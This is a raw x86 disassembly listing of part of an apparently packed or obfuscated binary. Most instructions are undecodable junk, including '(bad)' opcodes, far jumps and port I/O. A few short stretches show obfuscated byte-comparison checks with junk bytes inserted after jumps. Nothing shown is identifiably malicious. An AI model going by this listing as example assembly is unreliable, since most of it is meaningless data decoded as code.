  414201:	add    eax,DWORD PTR [edx]
  414203:	jnp    0x4141a5
  414205:	loope  0x414263
  414207:	(bad)  
  414208:	cmp    ebx,DWORD PTR [eax+0x4b88c813]
  41420e:	je     0x414200
  414210:	test   ebp,edx
  414212:	pop    eax
  414213:	mov    esp,0xa5a421b4
  414218:	stos   BYTE PTR es:[edi],al
  414219:	sbb    edi,DWORD PTR [ebx+0x56]
  41421c:	inc    ebx
  41421d:	jns    0x414254
  41421f:	lds    esi,FWORD PTR ds:0xce0aab81
  414225:	out    dx,al
  414226:	iret   
  414227:	into   
  414228:	jle    0x4141f5
  41422a:	call   0x1e6a40b5
  41422f:	jne    0x4141da
  414231:	cld    
  414232:	scas   eax,DWORD PTR es:[edi]
  414233:	outs   dx,BYTE PTR ds:[esi]
  414234:	cmp    BYTE PTR ds:0x8bed9081,ah
  41423a:	xor    DWORD PTR [ebp+edx*2-0x29],0xc323d159
  414242:	jl     0x414284
  414244:	mov    ebp,0x2c412fab
  414249:	and    al,0x47
  41424b:	or     esi,DWORD PTR [ecx+eax*4-0x24daaaa6]
  414252:	mov    bh,0x8c
  414254:	test   DWORD PTR [esi+0x2c48c246],0x7d083857
  41425e:	mov    ebp,DWORD PTR [ecx+ebx*1+0xe015fcd]
  414265:	fbld   TBYTE PTR [edi]
  414267:	mov    al,ds:0x4a936a2f
  41426c:	jecxz  0x414227
  41426e:	inc    esp
  41426f:	push   0xffffff96
  414271:	push   ds
  414272:	adc    DWORD PTR [edi],0x7e
  414275:	mov    esp,0x6ef06570
  41427a:	addr16 clc 
  41427c:	cmp    eax,DWORD PTR [edi]
  41427e:	and    edx,0x48
  414281:	dec    edx
  414282:	add    eax,0xe801d964
  414287:	push   ebp
  414288:	or     al,ah
  41428a:	mov    dh,0xac
  41428c:	(bad)  
  41428d:	mov    ah,BYTE PTR [edx+0x7f]
  414290:	inc    esp
  414291:	clc    
  414292:	pop    ebx
  414293:	pop    ss
  414294:	(bad)  
  414295:	aam    0x3d
  414297:	cmp    DWORD PTR [ebx-0x6b33df60],0x1
  41429e:	fwait
  41429f:	jo     0x4142d2
  4142a1:	pop    ds
  4142a2:	popa   
  4142a3:	retf   0xc234
  4142a6:	shr    BYTE PTR [eax+0x79d6a986],cl
  4142ac:	jmp    0x115bb5a0
  4142b1:	por    mm7,QWORD PTR [ecx-0x765b8c04]
  4142b8:	xchg   esp,eax
  4142b9:	popf   
  4142ba:	mul    DWORD PTR [eax-0x6317c515]
  4142c0:	mov    ebx,0x71b18f47
  4142c5:	pushf  
  4142c6:	adc    ch,BYTE PTR [esi+ebx*4+0x7f]
  4142ca:	cmp    BYTE PTR [ebx+0x27],dl
  4142cd:	jmp    0x35cf:0xd842f736
  4142d4:	fld    TBYTE PTR [esp+ecx*1+0x38658960]
  4142db:	das    
  4142dc:	inc    ebp
  4142dd:	mov    edx,0x4726555c
  4142e2:	cdq    
  4142e3:	dec    edx
  4142e4:	and    eax,0x3a517a55
  4142e9:	(bad)  [esp+eax*1-0x129dc79e]
  4142f0:	into   
  4142f1:	adc    eax,0x67cec715
  4142f6:	js     0x414367
  4142f8:	sbb    DWORD PTR [edx+0x3d],0x9d4f5f1b
  4142ff:	cld    
  414300:	js     0x4142d0
  414302:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414303:	(bad)  
  414304:	ds pop es
  414306:	xor    BYTE PTR [edx],bl
  414308:	jb     0x41432e
  41430a:	inc    ebp
  41430b:	inc    edi
  41430c:	aam    0xb0
  41430e:	xor    eax,0x64f460d6
  414313:	outs   dx,DWORD PTR ds:[esi]
  414314:	sub    eax,0x23424f5f
  414319:	jno    0x414378
  41431b:	aaa    
  41431c:	or     eax,0xe30db2a9
  414321:	cld    
  414322:	push   ebx
  414323:	retf   
  414324:	pop    ss
  414325:	cwde   
  414326:	shl    edx,cl
  414328:	popf   
  414329:	fs push ebp
  41432b:	fidiv  WORD PTR [edi]
  41432d:	sub    ch,BYTE PTR [edi-0x6bd20bab]
  414333:	pop    es
  414334:	shr    BYTE PTR [ebp-0x5c],0x57
  414338:	jb     0x414332
  41433a:	xor    ah,BYTE PTR [edx+eax*2-0x4b]
  41433e:	das    
  41433f:	xor    al,al
  414341:	pop    ecx
  414342:	loope  0x4142f8
  414344:	cmc    
  414345:	mov    cl,0x27
  414347:	std    
  414348:	cmp    eax,0x82efc758
  41434d:	stos   BYTE PTR es:[edi],al
  41434e:	aam    0xea
  414350:	add    bl,BYTE PTR [ecx-0x3c6b2beb]
  414356:	adc    al,0x31
  414358:	pop    ss
  414359:	xchg   BYTE PTR [esp+ebx*4],ah
  41435c:	out    0x87,al
  41435e:	dec    ecx
  41435f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  414360:	mov    al,0x17
  414362:	aaa    
  414363:	ds mov bh,0xb2
  414366:	loopne 0x41431e
  414368:	add    DWORD PTR [eax-0x6c63bfed],edi
  41436e:	and    BYTE PTR [ecx],cl
  414370:	sub    ebx,ebp
  414372:	cmp    eax,0xb30117c4
  414377:	daa    
  414378:	xchg   ebx,eax
  414379:	sbb    al,0x9d
  41437b:	mov    DWORD PTR [ecx+0x30e69c73],ecx
  414381:	dec    esp
  414382:	js     0x41430d
  414384:	adc    cl,BYTE PTR [edx-0x18]
  414387:	push   0x8bccfc2e
  41438c:	push   esi
  41438d:	mov    bh,0xe3
  41438f:	add    DWORD PTR ds:0x275e9a02,esi
  414395:	xor    DWORD PTR [ebx+0x2f7e77c6],esi
  41439b:	fidivr WORD PTR [edx]
  41439d:	xor    al,0x48
  41439f:	into   
  4143a0:	pop    edi
  4143a1:	inc    eax
  4143a2:	pop    esi
  4143a3:	jge    0x41437a
  4143a5:	or     edi,eax
  4143a7:	fs ffree st(5)
  4143aa:	pop    eax
  4143ab:	mov    WORD PTR [esi+0x1d],gs
  4143ae:	outs   dx,DWORD PTR ds:[esi]
  4143af:	push   esi
  4143b0:	jecxz  0x414393
  4143b2:	jmp    0x414337
  4143b4:	std    
  4143b5:	pop    eax
  4143b6:	repz dec ebx
  4143b8:	push   edx
  4143b9:	repz mov esp,DWORD PTR [ecx]
  4143bc:	mov    al,ds:0xd8d1bf46
  4143c1:	fldenv [ebp+0x793625bf]
  4143c7:	push   0x5d
  4143c9:	bnd jmp 0x41439b
  4143cc:	outs   dx,BYTE PTR ds:[esi]
  4143cd:	sahf   
  4143ce:	popa   
  4143cf:	lahf   
  4143d0:	mov    edi,0xa25e7c38
  4143d5:	or     dl,al
  4143d7:	lea    eax,[edx]
  4143d9:	sar    DWORD PTR [ebp-0x56],0xc5
  4143dd:	mov    edi,0x5254aad1
  4143e2:	adc    DWORD PTR ds:0x1f2a1aa4,0xffffffc8
  4143e9:	imul   esi,DWORD PTR [edx+0x34],0xffffffbf
  4143ed:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4143ee:	xchg   esi,eax
  4143ef:	sub    BYTE PTR [edi+0x1d0c9fa6],ah
  4143f5:	fist   WORD PTR [ebp-0x2385ccea]
  4143fb:	into   
  4143fc:	int    0xf
  4143fe:	push   cs
  4143ff:	into   
  414400:	or     BYTE PTR [edi+0x62f6d035],ah
  414406:	xchg   DWORD PTR [ebx-0x5c0e31e],ecx
  41440c:	mov    esi,0xbbda5227
  414411:	mov    ebp,0x7e771292
  414416:	fst    DWORD PTR [edx-0x1a]
  414419:	or     DWORD PTR [ecx+0x53],ebx
  41441c:	call   0x83d3:0x3e55fb55
  414423:	fdivr  st(7),st
  414425:	inc    ebp
  414426:	std    
  414427:	pop    edi
  414428:	nop
  414429:	mov    edi,0x417185ca
  41442e:	aam    0x50
  414430:	imul   ebx,DWORD PTR [esi],0xffffffd5
  414433:	jmp    0x4144b0
  414435:	(bad)  
  414437:	cdq    
  414438:	mov    eax,ds:0x4abd0a44
  41443d:	jno    0x4143e3
  41443f:	pusha  
  414440:	repz dec edx
  414442:	jp     0x414481
  414444:	jo     0x4143f4
  414446:	push   eax
  414447:	mov    esi,0x55921748
  41444c:	imul   edi,DWORD PTR [ebp-0x1d],0xceac6c97
  414453:	shr    bh,1
  414455:	or     eax,0x5ac923c5
  41445a:	mov    cl,0x9c
  41445c:	xor    bl,BYTE PTR [ebx-0x73]
  41445f:	not    DWORD PTR [esi-0x9]
  414462:	push   ss
  414463:	or     edi,edx
  414465:	outs   dx,BYTE PTR ds:[esi]
  414466:	push   edx
  414467:	enter  0x555f,0xd0
  41446b:	(bad)  
  41446c:	push   eax
  41446d:	push   0x1d
  41446f:	not    BYTE PTR [ebp+0x28a2841c]
  414475:	call   0x2b82487d
  41447a:	bound  ecx,QWORD PTR [edi]
  41447c:	ds addr16 sub al,0x54
  414480:	pop    es
  414481:	in     al,dx
  414482:	xor    BYTE PTR es:[ebx+0x62],bl
  414486:	test   al,0x2
  414488:	and    DWORD PTR [edi-0x302c9afe],0x8d519550
  414492:	pop    ecx
  414493:	dec    eax
  414494:	xchg   ebp,eax
  414495:	dec    edx
  414496:	in     eax,0x92
  414498:	scas   al,BYTE PTR es:[edi]
  414499:	mov    al,BYTE PTR [eax-0x1a]
  41449c:	sbb    eax,0xa2fbbeaa
  4144a1:	xchg   ecx,eax
  4144a2:	adc    BYTE PTR [edi+0x19],al
  4144a5:	sbb    esp,ebx
  4144a7:	fs stos DWORD PTR es:[edi],eax
  4144a9:	xchg   esp,eax
  4144aa:	add    eax,ecx
  4144ac:	into   
  4144ad:	ins    BYTE PTR es:[edi],dx
  4144ae:	sub    eax,0x40c6174b
  4144b3:	xchg   ecx,eax
  4144b4:	icebp  
  4144b5:	fwait
  4144b6:	dec    ecx
  4144b7:	mov    gs,ebp
  4144b9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4144ba:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4144bb:	cmp    DWORD PTR [ebp-0x5f],0x3f
  4144bf:	gs xchg ebp,eax
  4144c1:	ret    
  4144c2:	imul   edi,DWORD PTR [esi-0xaed7396],0xfffffff2
  4144c9:	jp     0x414480
  4144cb:	xchg   esp,eax
  4144cc:	ret    
  4144cd:	(bad)  
  4144ce:	lea    eax,[eax-0x70]
  4144d1:	mov    ebx,0x5cbb243b
  4144d6:	sbb    ebp,DWORD PTR ds:0x3544cd54
  4144dc:	and    ebx,esp
  4144de:	inc    ecx
  4144df:	aam    0x5d
  4144e1:	mov    eax,es:0xc9137047
  4144e7:	loop   0x4144b1
  4144e9:	sub    BYTE PTR [eax+0x75119c26],cl
  4144ef:	and    al,0xee
  4144f1:	call   0xbc33:0x4c9ccfbc
  4144f8:	dec    esi
  4144f9:	lods   al,BYTE PTR ds:[esi]
  4144fa:	push   esi
  4144fb:	cli    
  4144fc:	sbb    ebp,DWORD PTR [edx]
  4144fe:	loope  0x414529
  414500:	icebp  
  414501:	mov    eax,0x92fe1bc1
  414506:	repnz (bad) 
  414508:	mov    ch,0xa
  41450a:	adc    eax,0x4f845c7
  41450f:	xor    al,BYTE PTR [eax]
  414511:	add    bh,al
  414513:	inc    ebp
  414514:	cld    
  414515:	jmp    0xc845:0xc7000062
  41451c:	jmp    0xc7414579
  414521:	inc    ebp
  414522:	int3   
  414523:	mov    DWORD PTR [edi+0x0],edi
  414526:	add    bh,al
  414528:	inc    ebp
  414529:	rcr    dl,1
  41452b:	jg     0x41452d
  41452d:	add    bh,al
  41452f:	inc    ebp
  414530:	aam    0x89
  414532:	sub    BYTE PTR [eax],al
  414534:	add    bh,al
  414536:	inc    ebp
  414537:	fmul   DWORD PTR [edi]
  414539:	sldt   WORD PTR [eax]
  41453c:	mov    DWORD PTR [ebp-0x24],0x58e1
  414543:	mov    DWORD PTR [ebp-0x3c],0x69c
  41454a:	mov    eax,DWORD PTR [ebp-0x10]
  41454d:	mov    ecx,DWORD PTR [ebp-0x14]
  414550:	and    al,0xb9
  414552:	add    al,cl
  414554:	mov    ecx,DWORD PTR [ebp-0x18]
  414557:	and    al,cl
  414559:	mov    ecx,DWORD PTR [ebp-0x1c]
  41455c:	sub    al,0x11
  41455e:	and    al,cl
  414560:	mov    ecx,DWORD PTR [ebp-0x20]
  414563:	mov    edx,DWORD PTR [ebp+0x8]
  414566:	imul   ecx,ecx,0x6008
  41456c:	add    ecx,0x1759dd6e
  414572:	add    al,0x4d
  414574:	xor    ecx,0x2b4185ee
  41457a:	cmp    BYTE PTR [ecx+edx*1],al
  41457d:	jne    0x414da1
  414583:	jmp    0x414948
  414588:	push   cs
  414589:	mov    WORD PTR [edi],gs
  41458b:	dec    edx
  41458c:	sub    ch,BYTE PTR [edx]
  41458e:	jmp    0xfe7c:0x73623c4c
  414595:	jnp    0x414530
  414597:	mov    esp,0x181824d2
  41459c:	rcl    BYTE PTR [edx],1
  41459e:	sbb    BYTE PTR [eax],bl
  4145a0:	call   0x6205079
  4145a5:	test   DWORD PTR [esi+ebx*2],edi
  4145a8:	(bad)  [esi]
  4145aa:	ins    BYTE PTR es:[edi],dx
  4145ab:	(bad)  
  4145ac:	xor    eax,0xe24e7676
  4145b1:	daa    
  4145b2:	push   es
  4145b3:	mov    DWORD PTR [eax-0x5b7dd52f],eax
  4145b9:	inc    edi
  4145ba:	xor    eax,0xc3820079
  4145bf:	lods   eax,DWORD PTR ds:[esi]
  4145c0:	jmp    0x41455f
  4145c2:	aas    
  4145c3:	lea    eax,[ebx]
  4145c5:	jne    0x4145a6
  4145c7:	push   0x427d752a
  4145cc:	xchg   dh,cl
  4145ce:	es mov edi,0xb94b305
  4145d5:	sbb    DWORD PTR [ebx+0x2a2fb71a],eax
  4145db:	daa    
  4145dc:	jge    0x414574
  4145de:	fstp   TBYTE PTR [esi+0x74b7e76d]
  4145e4:	rcl    BYTE PTR [ecx],cl
  4145e6:	xor    DWORD PTR [edx],esp
  4145e8:	or     DWORD PTR [ebx],esp
  4145ea:	cmp    esi,esp
  4145ec:	push   ebp
  4145ed:	mov    dl,0xad
  4145ef:	aaa    
  4145f0:	mov    ds:0xb36ad73b,al
  4145f5:	out    0x2f,al
  4145f7:	sbb    al,0x51
  4145f9:	scas   eax,DWORD PTR es:[edi]
  4145fa:	sar    BYTE PTR [ecx-0x6ef55104],1
  414600:	push   DWORD PTR [ecx+0x28891074]
  414606:	adc    eax,0xc44f8c2c
  41460b:	bnd gs jbe 0x414678
  41460f:	data16 adc dh,BYTE PTR [edi-0x31]
  414613:	cmp    eax,0xf0b9c87f
  414618:	and    ebp,DWORD PTR [eax+0x789dd714]
  41461e:	adc    esi,DWORD PTR [ecx-0x600ec567]
  414624:	in     eax,dx
  414625:	repnz mov BYTE PTR [esi],ch
  414628:	push   cs
  414629:	cld    
  41462a:	pop    ebp
  41462b:	aas    
  41462c:	ins    DWORD PTR es:[edi],dx
  41462d:	pop    edx
  41462e:	jmp    0x414676
  414630:	push   es
  414631:	pop    es
  414632:	out    dx,eax
  414633:	fsincos 
  414635:	xchg   ebx,eax
  414636:	xchg   ecx,eax
  414637:	fwait
  414638:	pop    ss
  414639:	fwait
  41463a:	jle    0x4145d3
  41463c:	mov    ah,0xff
  41463e:	ins    DWORD PTR es:[edi],dx
  41463f:	mov    dl,0x77
  414641:	dec    eax
  414642:	loopne 0x414690
  414644:	test   DWORD PTR [edx],esp
  414646:	rol    BYTE PTR [eax+0x6e2644e7],cl
  41464c:	lods   eax,DWORD PTR es:[esi]
  41464e:	add    al,0xc8
  414650:	aad    0xb6
  414652:	ror    DWORD PTR [edx-0x4a],cl
  414655:	mov    esi,DWORD PTR [edx+0x7a]
  414658:	fwait
  414659:	push   ds
  41465a:	mov    esp,0x76310d9
  41465f:	inc    edi
  414660:	sbb    bh,BYTE PTR [esi-0x5a]
  414663:	inc    edx
  414664:	and    DWORD PTR [edx-0xb0fd0e6],ebx
  41466a:	sahf   
  41466b:	push   ss
  41466c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41466d:	xchg   esi,eax
  41466e:	dec    edx
  41466f:	gs pop edi
  414671:	sbb    ebx,DWORD PTR ds:[edx]
  414674:	ret    0x1ef5
  414677:	lods   al,BYTE PTR ds:[esi]
  414678:	pushf  
  414679:	cmc    
  41467a:	loop   0x414685
  41467c:	mov    al,ds:0xde77187e
  414681:	stos   DWORD PTR es:[edi],eax
  414682:	repz hlt 
  414684:	or     al,0xcd
  414686:	sub    dl,BYTE PTR [ecx+0x38]
  414689:	inc    esp
  41468a:	stos   DWORD PTR es:[edi],eax
  41468b:	mov    ah,0x48
  41468d:	ja     0x41461a
  41468f:	inc    esp
  414690:	mov    cl,BYTE PTR [ecx-0x5d]
  414693:	push   esp
  414694:	into   
  414695:	and    BYTE PTR [ebx],dh
  414697:	out    dx,eax
  414698:	inc    edi
  41469a:	cmp    BYTE PTR ds:0x1af8484d,dh
  4146a0:	mov    bl,0x3
  4146a2:	in     eax,0x70
  4146a4:	jmp    0xac0d:0xe79526b9
  4146ab:	outs   dx,DWORD PTR ds:[esi]
  4146ac:	pop    ebx
  4146ad:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4146ae:	adc    ebp,ecx
  4146b0:	scas   eax,DWORD PTR es:[edi]
  4146b1:	xor    DWORD PTR [eax+0x401f06cd],esi
  4146b7:	push   0xffffffba
  4146b9:	(bad)  
  4146ba:	fiadd  DWORD PTR [edx+0x4b]
  4146bd:	mov    esp,0x625ec559
  4146c2:	adc    eax,0x636d69c2
  4146c7:	sbb    eax,0x74d2b3d8
  4146cc:	aaa    
  4146cd:	sub    al,0x61
  4146cf:	sti    
  4146d0:	(bad)  
  4146d1:	dec    DWORD PTR [ecx+ebx*1+0x3bf32542]
  4146d8:	add    eax,0x14201150
  4146dd:	xchg   ebx,eax
  4146de:	popa   
  4146df:	lea    eax,[eax+0x77af9947]
  4146e5:	xchg   edx,eax
  4146e6:	popa   
  4146e7:	sar    BYTE PTR [edx+edi*8-0x74],1
  4146eb:	dec    edx
  4146ec:	pop    ds
  4146ed:	xchg   ebx,eax
  4146ee:	and    BYTE PTR [ecx],0x14
  4146f1:	fsub   QWORD PTR [ebx]
  4146f3:	test   BYTE PTR [ecx-0x4de1b2fe],dh
  4146f9:	jae    0x4146e2
  4146fb:	shl    DWORD PTR [ebx],cl
  4146fd:	bound  eax,QWORD PTR [esi]
  4146ff:	mov    edx,0x4c1982d5
  414704:	mov    edx,0x18a683dc
  414709:	mov    WORD PTR [ebp-0x48719a31],?
  41470f:	call   0xa543d470
  414714:	xchg   ebp,eax
  414715:	or     eax,0xf9c4ee10
  41471a:	xchg   ah,dl
  41471c:	icebp  
  41471d:	dec    esp
  41471e:	sub    ecx,DWORD PTR [ebx+0x24874fd4]
  414724:	fsubr  st(4),st
  414726:	mov    al,0xdf
  414728:	out    0x2b,al
  41472a:	xor    al,0xf9
  41472c:	jmp    0x414788
  41472e:	inc    esi
  41472f:	or     eax,DWORD PTR [eax]
  414731:	mov    gs:0x24879910,eax
  414737:	fsubr  st(7),st
  414739:	cmp    BYTE PTR es:[ecx-0x1d],dl
  41473d:	jmp    0x414753
  41473f:	sbb    BYTE PTR [edx],bh
  414741:	sub    dl,BYTE PTR [eax]
  414743:	lods   eax,DWORD PTR ds:[esi]
  414744:	in     al,dx
  414745:	out    0x5b,al
  414747:	sbb    DWORD PTR [ebx+0x2eacd239],0xeaa13b00
  414751:	rol    BYTE PTR [eax-0x1b],cl
  414754:	imul   edx,esi,0xffffffbe
  414757:	mov    cl,0xb4
  414759:	aad    0x0
  41475b:	hlt    
  41475c:	xor    DWORD PTR [ecx-0x76beb923],0x214e9be4
  414766:	mov    al,0xd2
  414768:	mov    ds:0x8a8ceca0,eax
  41476d:	and    bh,BYTE PTR [esi]
  41476f:	sub    dl,ch
  414771:	xor    bh,BYTE PTR [eax]
  414773:	dec    edi
  414774:	repnz cmp al,0xfb
  414777:	mov    WORD PTR [eax+0xb],?
  41477a:	out    dx,al
  41477b:	mov    cl,0x57
  41477d:	jecxz  0x41472d
  41477f:	hlt    
  414780:	mov    ds:0x1c81322c,eax
  414785:	dec    ecx
  414786:	bound  eax,QWORD PTR [edi+ecx*1+0x78552941]
  41478d:	aam    0xd9
  41478f:	sub    DWORD PTR [esi-0x20c2120e],edx
  414795:	fisubr DWORD PTR [eax-0x1c7c0c73]
  41479b:	test   al,0x40
  41479d:	in     eax,0x29
  41479f:	push   ss
  4147a0:	shr    DWORD PTR [esp+eax*8+0x1e0a9df7],1
  4147a7:	fnstenv [edi+0x2e175b0e]
  4147ad:	mov    al,0xa4
  4147af:	pusha  
  4147b0:	mov    eax,ds:0x47c7f559
  4147b5:	cwde   
  4147b6:	test   al,0xc7
  4147b8:	mov    cl,0x47
  4147ba:	lods   eax,DWORD PTR ds:[esi]
  4147bb:	ret    0x1851
  4147be:	jo     0x4147bd
  4147c0:	cmp    BYTE PTR [edi],ah
  4147c2:	jge    0x414751
  4147c4:	adc    esi,DWORD PTR [esi]
  4147c6:	cmc    
  4147c7:	cmp    ecx,ebp
  4147c9:	jo     0x414780
  4147cb:	push   esp
  4147cc:	ret    
  4147cd:	std    
  4147ce:	fisttp WORD PTR [esi-0x35]
  4147d1:	jmp    0xdf7d:0xbb50ceab
  4147d8:	sbb    al,0xe3
  4147da:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4147db:	mov    ebp,0x4b95f209
  4147e0:	jb     0x414807
  4147e2:	aam    0xb9
  4147e4:	in     eax,0x10
  4147e6:	xchg   esp,eax
  4147e7:	jle    0x4147c0
  4147e9:	or     cl,BYTE PTR [ebp+0x7305607f]
  4147ef:	sbb    DWORD PTR [edx],0x68b67f1b
  4147f5:	jb     0x4147fd
  4147f7:	mov    ch,0xb
  4147f9:	jb     0x414798
  4147fb:	aaa    
  4147fc:	sub    ecx,edi
  4147fe:	imul   ebx,DWORD PTR [esi],0xffffff89
  414801:	ins    BYTE PTR es:[edi],dx
  414802:	cli    
  414803:	les    edx,FWORD PTR [esi]
  414805:	or     DWORD PTR [ecx],ecx
  414807:	adc    al,0x61
  414809:	mov    dh,0xea
  41480b:	or     al,ch
  41480d:	pop    esp
  41480e:	inc    eax
  41480f:	mov    bh,BYTE PTR [eax+0x3a2ee3bd]
  414815:	push   ss
  414816:	jae    0x414875
  414818:	int3   
  414819:	sub    eax,0x25b1e85d
  41481e:	test   eax,0x35c71e07
  414823:	mov    cl,0x88
  414825:	arpl   WORD PTR [edi-0x28],dx
  414828:	cli    
  414829:	xchg   BYTE PTR [edx],al
  41482b:	xor    al,0x25
  41482d:	add    dh,ah
  41482f:	(bad)  
  414830:	aam    0xdb
  414832:	call   0x1dc6:0x74b26ac4
  414839:	out    dx,al
  41483a:	or     DWORD PTR [eax+0x3f],ebx
  41483d:	das    
  41483e:	pop    esi
  41483f:	adc    al,0x8b
  414841:	aam    0x33
  414843:	mov    al,ds:0x54d28a95
  414848:	imul   BYTE PTR [edx]
  41484a:	nop
  41484b:	add    DWORD PTR [esi],edi
  41484d:	repz cwde 
  41484f:	pop    esp
  414850:	sub    DWORD PTR [ecx+edi*1+0x65e4c6fd],edx
  414857:	fidiv  DWORD PTR [ebx+0x735cb89c]
  41485d:	imul   ecx,ebp,0xffffffbd
  414860:	xor    DWORD PTR ds:0x91eecd40,esi
  414866:	in     eax,dx
  414867:	inc    eax
  414868:	cmp    DWORD PTR [eax+0x5355186],0xffffffb0
  41486f:	cmp    dh,bl
  414871:	push   eax
  414872:	stos   DWORD PTR es:[di],eax
  414874:	cwde   
  414875:	adc    eax,0x63c176d0
  41487a:	pop    eax
  41487b:	ret    
  41487c:	xchg   edx,eax
  41487d:	add    edx,ecx
  41487f:	or     esi,ebx
  414881:	push   esp
  414882:	xchg   esi,eax
  414883:	inc    edi
  414884:	les    bp,DWORD PTR [ecx-0x60b0ab59]
  41488b:	sub    edi,DWORD PTR [edx+0x67]
  41488e:	xor    bl,BYTE PTR [edx-0x31]
  414891:	mov    DWORD PTR [ecx+0x1abc0524],ecx
  414897:	xor    esp,esi
  414899:	inc    ebx
  41489a:	sti    
  41489b:	test   al,0x72
  41489d:	es cmp esi,ebp
  4148a0:	ror    ecx,0xee
  4148a3:	or     ebp,DWORD PTR [ebx]
  4148a5:	mov    esp,esi
  4148a7:	add    ebx,edx
  4148a9:	daa    
  4148aa:	jg     0x41486a
  4148ac:	fild   WORD PTR [eax-0x2a317c58]
  4148b2:	pop    esp
  4148b3:	lods   al,BYTE PTR ss:[esi]
  4148b5:	outs   dx,BYTE PTR ds:[esi]
  4148b6:	cmp    al,0x80
  4148b8:	adc    eax,0x4ecda95
  4148bd:	into   
  4148be:	retf   
  4148bf:	fdiv   QWORD PTR [edi]
  4148c1:	push   esi
  4148c2:	fadd   DWORD PTR [edx-0x13]
  4148c6:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4148c7:	and    BYTE PTR [edi+0x6eae6b5],bl
  4148cd:	jmp    0xcf99:0x91f4
  4148d3:	xchg   esi,eax
  4148d4:	getsec 
  4148d6:	dec    edi
  4148d7:	idiv   DWORD PTR [esi-0x7f476eb1]
  4148dd:	js     0x414886
  4148df:	repz dec ecx
  4148e1:	inc    eax
  4148e2:	push   edi
  4148e3:	xchg   esp,eax
  4148e4:	imul   edx,eax,0xfc5e7b8d
  4148ea:	test   al,0x4d
  4148ec:	(bad)  
  4148ee:	mov    ebx,0xa9833429
  4148f3:	xlat   BYTE PTR ds:[ebx]
  4148f4:	nop
  4148f5:	mov    eax,ds:0x52587649
  4148fa:	mov    ebx,0xf0c00ff3
  4148ff:	push   cs
  414900:	ret    0xc656
  414903:	dec    ecx
  414904:	inc    edx
  414905:	dec    ecx
  414906:	xor    esi,ebp
  414908:	dec    esi
  414909:	pop    ebx
  41490a:	dec    ebx
  41490b:	imul   ebp,edi,0x31f40741
  414911:	(bad)  [edi-0x32]
  414914:	cs daa 
  414916:	clc    
  414917:	add    al,BYTE PTR [esi+0x52394cdd]
  41491d:	outs   dx,DWORD PTR ds:[esi]
  41491e:	sbb    ebp,DWORD PTR [edx+edx*1-0x69b3351d]
  414925:	daa    
  414926:	jmp    0x41498a
  414928:	ins    BYTE PTR es:[edi],dx
  414929:	int3   
  41492a:	xchg   esp,eax
  41492b:	mov    ah,0x75
  41492d:	add    ch,0xf2
  414930:	add    eax,0x486cf076
  414935:	fld    DWORD PTR [eax]
  414937:	push   cs
  414938:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414939:	mov    ebx,0xe05df1d6
  41493e:	mov    eax,ds:0x235773ed
  414943:	data16 add al,0xa0
  414946:	push   eax
  414947:	outs   dx,BYTE PTR ds:[esi]
  414948:	mov    ecx,DWORD PTR [ebp-0x4]
  41494b:	mov    eax,0xffffeff8
  414950:	mov    edx,eax
  414952:	sub    edx,ecx
  414954:	add    edx,DWORD PTR [ebp-0x8]
  414957:	mov    ecx,DWORD PTR [ebp-0xc]
  41495a:	or     edx,ecx
  41495c:	mov    ecx,DWORD PTR [ebp-0x4]
  41495f:	imul   edx,edx,0x85300
  414965:	sub    eax,ecx
  414967:	add    eax,DWORD PTR [ebp-0x8]
  41496a:	mov    ecx,DWORD PTR [ebp-0xc]
  41496d:	or     eax,ecx
  41496f:	mov    ecx,DWORD PTR [ebp+0x8]
  414972:	mov    ecx,DWORD PTR [edx+ecx*1+0x1c323f3c]
  414979:	add    eax,0x40e5
  41497e:	imul   eax,eax,0x214c
  414984:	jmp    0x414d49
  414989:	retf   0x46a0
  41498c:	mov    ds:0xa02a1a22,al
  414991:	pop    es
  414992:	inc    ecx
  414993:	repnz push 0x1
  414996:	xchg   ebx,eax
  414997:	leave  
  414998:	jl     0x414925
  41499a:	sbb    al,0x18
  41499c:	sbb    al,dl
  41499e:	adc    bl,BYTE PTR [eax]
  4149a0:	sbb    dh,bl
  4149a2:	stc    
  4149a3:	retf   0x16e0
  4149a6:	cmp    DWORD PTR [ecx],edi
  4149a8:	or     eax,0x2fabadfe
  4149ad:	dec    eax
  4149ae:	into   
  4149af:	popf   
  4149b0:	pop    ss
  4149b1:	push   edi
  4149b3:	dec    edx
  4149b4:	lods   eax,DWORD PTR ds:[esi]
  4149b5:	sub    esi,eax
  4149b7:	bound  esp,QWORD PTR [eax+0x18f4e4ea]
  4149bd:	es call 0x5a44c849
  4149c3:	jns    0x4149c5
  4149c5:	mov    al,0xef
  4149c7:	mov    ebp,edx
  4149c9:	jo     0x4149fd
  4149cb:	nop
  4149cc:	ds cwde 
  4149ce:	mov    dl,0x9f
  4149d0:	hlt    
  4149d1:	sbb    al,0xda
  4149d3:	pop    edx
  4149d4:	ins    BYTE PTR es:[edi],dx
  4149d5:	xchg   edi,eax
  4149d6:	das    
  4149d7:	jmp    0xc216:0xe1045f6c
  4149de:	mov    esp,0x569d463
  4149e3:	lahf   
  4149e4:	loop   0x4149c6
  4149e6:	push   eax
  4149e7:	inc    al
  4149e9:	sub    esi,DWORD PTR [edx+0x5082881d]
  4149ef:	add    ebx,esp
  4149f1:	lods   al,BYTE PTR ds:[esi]
  4149f2:	xor    ah,dh
  4149f4:	retf   0x98cb
  4149f7:	scas   eax,DWORD PTR es:[edi]
  4149f8:	pop    eax
  4149f9:	cs (bad) 
  4149fb:	imul   esp,DWORD PTR [eax+eiz*8+0x6f],0x165ff2c1
  414a03:	sbb    eax,0xc6cc487c
  414a08:	fs push ecx
  414a0a:	jecxz  0x4149db
  414a0c:	xlat   BYTE PTR ds:[ebx]
  414a0d:	repnz mov ecx,0xb6859b52
  414a13:	mov    DWORD PTR [esi+0xc],0xe097ab2b
  414a1a:	(bad)  
  414a1b:	out    0xbd,al
  414a1d:	xlat   BYTE PTR ds:[ebx]
  414a1e:	inc    esi
  414a1f:	sbb    eax,0x1225b826
  414a24:	out    0xde,al
  414a26:	cmp    eax,0xb58a8f32
  414a2b:	mov    dh,0xe5
